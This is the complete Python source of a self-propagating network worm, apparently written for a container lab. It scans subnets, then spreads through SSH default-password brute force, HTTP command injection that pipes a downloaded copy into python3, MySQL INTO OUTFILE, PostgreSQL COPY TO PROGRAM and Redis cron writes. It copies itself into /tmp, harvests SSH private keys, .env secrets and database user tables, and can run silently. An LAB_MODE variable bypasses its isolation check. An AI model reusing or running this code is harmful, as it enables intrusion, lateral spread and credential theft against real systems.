# built with assistance from the LLM hackerai.co

import csv
import random
import socket
import subprocess
import threading
import time
import os
import sys
import base64
import requests
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
import urllib.parse
import ssl
import http.server
import socketserver

class UniversalWorm:
    def __init__(self):
        # Parse --strategy flag before anything else
        self.strategy = "exhaustive"
        if "--strategy" in sys.argv:
            idx = sys.argv.index("--strategy")
            if idx + 1 < len(sys.argv):
                self.strategy = sys.argv[idx + 1]
                sys.argv.pop(idx)
                sys.argv.pop(idx)

        self.hostname = socket.gethostname()
        self.interfaces = self.get_all_interfaces()
        self.self_ip = self.get_self_ip()
        self.self_url = f"http://{self.self_ip}:8080/worm.py"
        self.subnets = self.discover_subnets()
        self.common_ports = [22, 80, 443, 8080, 8443, 3000, 5000, 9000, 8888, 3306, 5432, 6379]
        self.exploit_modules = {}
        self.infected = set()
        self.c2_urls = self.get_fallback_c2()
        self.stagnant_cycles = 0
        self.max_cycles = 10
        self.cycle_count = 0

        # Propagation tracking
        self.start_time = time.time()
        self.propagation_log = []   # {timestamp, elapsed_seconds, cycle, host, method, total_infected}

        # Credential harvesting buffers
        self.stolen_creds = []
        self.stolen_files = {}
        self.stolen_env = {}

        self.load_exploit_modules()
        threading.Thread(target=self.start_drop_server, daemon=True).start()
        print(f"[*] 🪱 DYNAMIC WORM → {self.hostname} → SELF_IP={self.self_ip} → strategy={self.strategy}", flush=True)

    def get_self_ip(self):
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: self.get_route_ip(),
            lambda: self.get_external_ip(),
            lambda: "127.0.0.1"
        ]
        for method in methods:
            try:
                ip = method()
                if ip != "127.0.0.1" and not ip.startswith("169.254"):
                    return ip
            except:
                continue
        return "127.0.0.1"

    def get_route_ip(self):
        try:
            result = subprocess.run(['ip', 'route', 'get', '1'], capture_output=True, text=True)
            parts = result.stdout.split()
            return parts[parts.index('src') + 1] if 'src' in parts else "127.0.0.1"
        except:
            return "127.0.0.1"

    def get_external_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def start_drop_server(self):
        try:
            tmp_path = "/tmp/worm.py"
            with open(__file__, 'r') as f:
                content = f.read()
            with open(tmp_path, 'w') as f:
                f.write(content)
            os.chmod(tmp_path, 0o755)
            
            class WormHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, directory="/tmp", **kwargs)
                def log_message(self, format, *args):
                    pass
            
            with socketserver.TCPServer(("0.0.0.0", 8080), WormHandler) as httpd:
                print(f"[*] 🎯 Drop server running at {self.self_url}", flush=True)
                httpd.serve_forever()
        except Exception as e:
            print(f"[!] Drop server failed: {e}", flush=True)

    def get_all_interfaces(self):
        interfaces = []
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line and not '127.0.0.1' in line:
                    ip = line.split()[1].split('/')[0]
                    interfaces.append(ip)
        except:
            pass
        return interfaces if interfaces else ["127.0.0.1"]

    def discover_subnets(self):
        subnets = []
        for ip in self.interfaces:
            parts = ip.split('.')
            if len(parts) == 4:
                subnet = '.'.join(parts[:3]) + '.'
                subnets.append(subnet)
        return list(set(subnets))

    def get_fallback_c2(self):
        return []

    def load_exploit_modules(self):
        self.exploit_modules = {
            22: self.ssh_bruteforce,
            80: self.http_rce,
            443: self.http_rce,
            8080: self.http_rce,
            8888: self.http_rce,
            9000: self.http_rce,
            3000: self.http_rce,
            5000: self.http_rce,
            3306: self.mysql_exploit,
            5432: self.pg_exploit,
            6379: self.redis_exploit
        }

    def generate_hosts(self):
        hosts = []
        for subnet in self.subnets:
            for i in range(1, 255):
                hosts.append(f"{subnet}{i}")
        # Always include known container names so they're targeted even if
        # subnet discovery misses them (e.g. dns, fileshare have no open ports)
        hosts.extend([
            "webserver", "victim", "db", "dns", "fileshare",
            "redis", "postgres", "jumpbox", "traffic_gen", "api",
            "localhost", "127.0.0.1"
        ])
        return list(set(hosts))

    def scan_port(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def mass_scan(self, hosts):
        if self.strategy == "random":
            targets = random.sample(hosts, min(30, len(hosts)))
        else:
            targets = hosts
        open_hosts = {}
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {
                executor.submit(self.scan_services, host): host
                for host in targets
            }
            for future in futures:
                host = futures[future]
                try:
                    services = future.result(timeout=10)
                    if services:
                        open_hosts[host] = services
                except:
                    pass
        return open_hosts

    def scan_services(self, host):
        services = {}
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.scan_port, host, port): port 
                      for port in self.common_ports}
            for future in futures:
                port = futures[future]
                if future.result():
                    services[port] = True
        return services if services else None

    # ========== CREDENTIAL HARVESTING ==========

    def harvest_mysql_credentials(self, host, port=3306, db_user='root', db_pass='root'):
        """Dump user accounts from MySQL databases using pymysql."""
        try:
            import pymysql
        except ImportError:
            return []

        SKIP_DBS = {'information_schema', 'performance_schema', 'mysql', 'sys'}
        found = []
        try:
            conn = pymysql.connect(host=host, port=port, user=db_user,
                                   password=db_pass, connect_timeout=5)
            with conn.cursor() as cur:
                cur.execute("SHOW DATABASES")
                databases = [r[0] for r in cur.fetchall() if r[0] not in SKIP_DBS]

            for db_name in databases:
                try:
                    conn.select_db(db_name)
                    with conn.cursor() as cur:
                        cur.execute("SHOW TABLES")
                        tables = [r[0] for r in cur.fetchall()]

                    user_tables = [t for t in tables
                                   if any(k in t.lower() for k in ('user', 'account', 'admin', 'credential'))]
                    if not user_tables and tables:
                        user_tables = tables[:1]

                    for table in user_tables:
                        try:
                            with conn.cursor() as cur:
                                cur.execute(f"SELECT * FROM `{table}` LIMIT 100")
                                cols = [d[0] for d in cur.description]
                                rows = [dict(zip(cols, row)) for row in cur.fetchall()]
                            if rows:
                                found.append({
                                    "source":  f"mysql:{host}:{port}/{db_name}.{table}",
                                    "db_user": db_user,
                                    "rows":    [str(r) for r in rows],
                                })
                        except:
                            continue
                except:
                    continue
            conn.close()
        except:
            pass
        return found

    def harvest_local_credentials(self):
        """Harvest SSH keys, env files, and config files from the local filesystem."""
        loot = {"ssh_keys": {}, "env_files": {}, "configs": {}}
        
        # SSH keys
        ssh_paths = ["/root/.ssh/id_rsa", "/root/.ssh/id_ed25519", "/root/.ssh/authorized_keys",
                     "/home/*/.ssh/id_rsa", "/home/*/.ssh/id_ed25519", "/home/*/.ssh/authorized_keys"]
        for pattern in ssh_paths:
            try:
                import glob
                for path in glob.glob(pattern):
                    try:
                        with open(path, 'r') as f:
                            content = f.read()
                        loot["ssh_keys"][path] = content
                    except:
                        pass
            except:
                pass
        
        # .env and config files
        env_patterns = ["/app/.env", "/var/www/.env", "/opt/app/.env", "/data/.env",
                        "/app/config.py", "/app/settings.py", "/app/app.py",
                        "/etc/mysql/debian.cnf", "/etc/mysql/my.cnf"]
        for path in env_patterns:
            if os.path.isfile(path):
                try:
                    with open(path, 'r') as f:
                        content = f.read()
                    loot["env_files"][path] = content
                except:
                    pass
        
        # Look for hardcoded passwords in known app files
        for root, dirs, files in os.walk("/app", followlinks=False):
            for fname in files:
                if fname.endswith(('.env', '.cfg', '.ini', '.yaml', '.yml', '.json', '.py')):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, 'r') as f:
                            data = f.read()
                        if any(k in data.lower() for k in ['password', 'secret', 'token', 'api_key', 'passwd']):
                            loot["configs"][fpath] = data[:2000]  # first 2KB
                    except:
                        pass
            break  # only top-level of /app
        
        return loot

    def print_credential_report(self):
        """Pretty-print all harvested credentials."""
        print("\n" + "="*70, flush=True)
        print("[💀] CREDENTIAL HARVEST REPORT", flush=True)
        print("="*70, flush=True)
        
        if self.stolen_creds:
            print(f"\n[+] Database Credentials ({len(self.stolen_creds)} sources):", flush=True)
            for item in self.stolen_creds:
                print(f"    Source: {item['source']}", flush=True)
                print(f"    DB Login: {item.get('db_user', 'unknown')}", flush=True)
                for row in item.get('rows', []):
                    print(f"      → {row}", flush=True)
        else:
            print("\n[-] No database credentials harvested.", flush=True)
        
        if self.stolen_files.get("ssh_keys"):
            print(f"\n[+] SSH Keys ({len(self.stolen_files['ssh_keys'])} files):", flush=True)
            for path, content in self.stolen_files["ssh_keys"].items():
                print(f"    File: {path}", flush=True)
                preview = content[:100].replace('\n', ' ')
                print(f"      → {preview}...", flush=True)
        
        if self.stolen_files.get("env_files"):
            print(f"\n[+] Environment / Config Files ({len(self.stolen_files['env_files'])} files):", flush=True)
            for path, content in self.stolen_files["env_files"].items():
                print(f"    File: {path}", flush=True)
                for line in content.split('\n')[:10]:
                    if any(k in line.lower() for k in ['pass', 'secret', 'key', 'token', 'auth']):
                        print(f"      ⚠ {line.strip()}", flush=True)
        
        if self.stolen_files.get("configs"):
            print(f"\n[+] App Config Files with Secrets ({len(self.stolen_files['configs'])} files):", flush=True)
            for path, content in self.stolen_files["configs"].items():
                print(f"    File: {path}", flush=True)
                for line in content.split('\n')[:5]:
                    print(f"      → {line.strip()}", flush=True)
        
        print("\n" + "="*70, flush=True)
        print("[💀] END OF CREDENTIAL REPORT", flush=True)
        print("="*70 + "\n", flush=True)

    # ========== PROPAGATION LOGGING ==========

    def log_infection(self, host, method):
        entry = {
            "timestamp":      time.strftime("%Y-%m-%dT%H:%M:%S"),
            "elapsed_seconds": round(time.time() - self.start_time, 2),
            "cycle":          self.cycle_count,
            "host":           host,
            "method":         method,
            "strategy":       self.strategy,
            "total_infected": len(self.infected),
        }
        self.propagation_log.append(entry)
        print(f"[📋] Logged infection: {host} via {method} at {entry['elapsed_seconds']}s", flush=True)

    def write_propagation_log(self):
        log_path = os.environ.get("PROPAGATION_LOG", "/uploads/propagation_log.csv")
        fields = ["timestamp", "elapsed_seconds", "cycle", "host", "method", "strategy", "total_infected"]
        try:
            with open(log_path, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=fields)
                writer.writeheader()
                writer.writerows(self.propagation_log)
            print(f"[📋] Propagation log saved → {log_path} ({len(self.propagation_log)} events)", flush=True)
        except Exception as e:
            print(f"[!] Could not write propagation log: {e}", flush=True)

    # ========== EXPLOITS ==========

    def http_rce(self, host, port=80):
        target_url = f"http://{host}:{port}"
        payloads = [
            f"{target_url}/ping?ip=;curl%20{self.self_url}|python3",
            f"{target_url}/?q=;wget%20-qO-%20{self.self_url}|python3",
        ]
        for payload in payloads:
            try:
                r = requests.get(payload, timeout=5, verify=False)
                if r.status_code == 200:
                    print(f"[+] HTTP→{host}:{port} payload delivered", flush=True)
                    self.infected.add(host)
                    self.log_infection(host, "HTTP RCE")
                    return True
            except:
                continue
        return False

    def ssh_bruteforce(self, host, port=22):
        creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'user')]
        payload = f"curl -s {self.self_url} | python3 &"
        for user, pwd in creds:
            try:
                result = subprocess.run(
                    ['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=3', f'{user}@{host}', payload],
                    timeout=5, capture_output=True
                )
                if result.returncode == 0:
                    print(f"[+] SSH→{host}:{user} Infected", flush=True)
                    self.infected.add(host)
                    self.log_infection(host, "SSH")
                    return True
            except:
                continue
        return False

    def mysql_exploit(self, host, port=3306):
        try:
            import pymysql
        except ImportError:
            return False

        creds = [('root', 'root'), ('root', ''), ('admin', 'admin'), ('mysql', 'mysql')]
        payload = f"curl -s {self.self_url} | python3 &"

        for user, pwd in creds:
            try:
                conn = pymysql.connect(host=host, port=port, user=user,
                                       password=pwd, connect_timeout=5)
                print(f"[+] MySQL→{host}:{port} ({user}) connected", flush=True)

                # Write worm payload via INTO OUTFILE
                with conn.cursor() as cur:
                    try:
                        cur.execute(
                            "SELECT %s INTO OUTFILE '/tmp/worm_mysql.sh'",
                            (f"#!/bin/bash\n{payload}\n",)
                        )
                    except Exception:
                        pass  # file may already exist — that's fine

                    # Execute via sys_exec if UDF is available
                    try:
                        cur.execute("SELECT sys_exec('bash /tmp/worm_mysql.sh')")
                    except Exception:
                        pass

                conn.close()

                # Harvest credentials regardless of exec success
                harvested = self.harvest_mysql_credentials(host, port, user, pwd)
                if harvested:
                    print(f"[💀] MySQL→{host} Harvested {len(harvested)} credential sources!", flush=True)
                    self.stolen_creds.extend(harvested)

                self.infected.add(host)
                self.log_infection(host, "MySQL")
                return True
            except:
                continue
        return False

    def pg_exploit(self, host, port=5432):
        creds = [('postgres', 'postgres'), ('postgres', ''), ('admin', 'admin')]
        payload = f"curl -s {self.self_url} | python3 &"
        for user, pwd in creds:
            try:
                os.environ['PGPASSWORD'] = pwd
                cmd = f"psql -h {host} -p {port} -U {user} -c \"COPY (SELECT '') TO PROGRAM 'bash -c \\\\\\\"{payload}\\\\\\\"'\" 2>/dev/null"
                if subprocess.run(cmd, shell=True).returncode == 0:
                    print(f"[+] PostgreSQL→{host}:{port} ({user}) Infected via COPY PROGRAM", flush=True)
                    self.infected.add(host)
                    self.log_infection(host, "PostgreSQL")
                    return True
            except:
                continue
        return False

    def redis_exploit(self, host, port=6379):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((host, port))
            payload = f"curl {self.self_url} | python3 &"
            payload_data = f"\n\n* * * * * root {payload}\n\n\n"
            cmds = [
                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$11\r\n/etc/cron.d\r\n",
                b"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nworm\r\n",
                f"*3\r\n$3\r\nSET\r\n$1\r\nx\r\n${len(payload_data)}\r\n{payload_data}".encode(),
                b"*1\r\n$4\r\nSAVE\r\n"
            ]
            for c in cmds:
                s.send(c)
                time.sleep(0.1)
            s.close()
            print(f"[+] Redis→{host}:{port} Infected (Cron Exploit)", flush=True)
            self.infected.add(host)
            self.log_infection(host, "Redis")
            return True
        except:
            return False

    def shared_fs_exploit(self):
        """Infect fileshare via the shared Docker volume (/uploads on api = /data on fileshare)."""
        for path in ["/uploads", "/data", "/shared"]:
            if not (os.path.isdir(path) and os.access(path, os.W_OK)):
                continue
            try:
                dest = os.path.join(path, "worm.py")
                with open(__file__, 'r') as f:
                    content = f.read()
                with open(dest, 'w') as f:
                    f.write(content)
                os.chmod(dest, 0o755)
                try:
                    fs_ip = socket.gethostbyname("fileshare")
                except Exception:
                    fs_ip = "fileshare"
                if fs_ip not in self.infected:
                    self.infected.add(fs_ip)
                    self.log_infection(fs_ip, "SharedFS")
                    print(f"[+] SharedFS→{fs_ip} Infected via {path}", flush=True)
                return True
            except Exception as e:
                print(f"[!] SharedFS exploit failed on {path}: {e}", flush=True)
        return False

    def infect_host(self, host, services):
        if host in self.infected:
            return
        print(f"[>] 🦠 Infecting {host} → ports {list(services.keys())}", flush=True)
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for port in services:
                if port in self.exploit_modules:
                    futures.append(executor.submit(self.exploit_modules[port], host, port))
            for future in futures:
                try:
                    future.result(timeout=15)
                except:
                    pass

    def persistence(self):
        paths = ["/tmp/worm.py", "/var/tmp/worm.py"]
        for path in paths:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(__file__, 'r') as f:
                    content = f.read()
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o755)
                print(f"[+] ✅ Persisted to {path}", flush=True)
                break
            except:
                continue

    def verify_isolation(self):
        if os.environ.get("LAB_MODE") == "1":
            print("[*] ✓ LAB_MODE=1 — authorized lab environment, skipping isolation check", flush=True)
            return True
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=2)
            print("[!] ⚠️ WARNING: Internet access detected! Aborting for safety.")
            return False
        except:
            print("[*] ✓ Network isolated - proceeding")
            return True

    def main(self):
        print(f"[*] 🌐 DEPLOYMENT → SELF_IP={self.self_ip} → {len(self.subnets)} subnets", flush=True)
        
        if not self.verify_isolation():
            print("[!] Aborting: Not in isolated environment")
            return
        
        priority_targets = sys.argv[1:] if len(sys.argv) > 1 else []
        if priority_targets:
            print(f"[*] Priority targets: {priority_targets}")
        
        self.persistence()
        self.shared_fs_exploit()
        time.sleep(2)

        hosts = self.generate_hosts()
        if priority_targets:
            hosts = priority_targets + [h for h in hosts if h not in priority_targets]
        
        print(f"[*] 🔍 Scanning {len(hosts)} hosts (max {self.max_cycles} cycles)...", flush=True)
        
        while self.cycle_count < self.max_cycles:
            self.cycle_count += 1
            print(f"\n[*] === CYCLE {self.cycle_count}/{self.max_cycles} ===", flush=True)
            
            open_hosts = self.mass_scan(hosts)
            print(f"[+] 🎯 {len(open_hosts)} hosts with open ports", flush=True)
            
            new_infections = 0
            for host, services in open_hosts.items():
                if host not in self.infected:
                    threading.Thread(target=self.infect_host, args=(host, services), daemon=True).start()
                    new_infections += 1
            
            if new_infections > 0:
                print(f"[+] {new_infections} new infection attempts", flush=True)
                self.stagnant_cycles = 0
            else:
                self.stagnant_cycles += 1
                print(f"[!] No new infections (stagnant: {self.stagnant_cycles})", flush=True)
            
            if self.stagnant_cycles >= 3:
                print("[*] No progress for 3 cycles. Network saturated. Stopping.")
                break

            time.sleep(10)
        
        # Print final credential report
        self.print_credential_report()
        
        self.write_propagation_log()

        print(f"\n[*] === WORM COMPLETE ===")
        print(f"[*] Strategy: {self.strategy}")
        print(f"[*] Cycles: {self.cycle_count}")
        print(f"[*] Total infected: {len(self.infected)}")
        print(f"[*] Infected hosts: {list(self.infected)}")

def silent_run():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = sys.stdout
    UniversalWorm().main()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'silent':
        silent_run()
    else:
        UniversalWorm().main()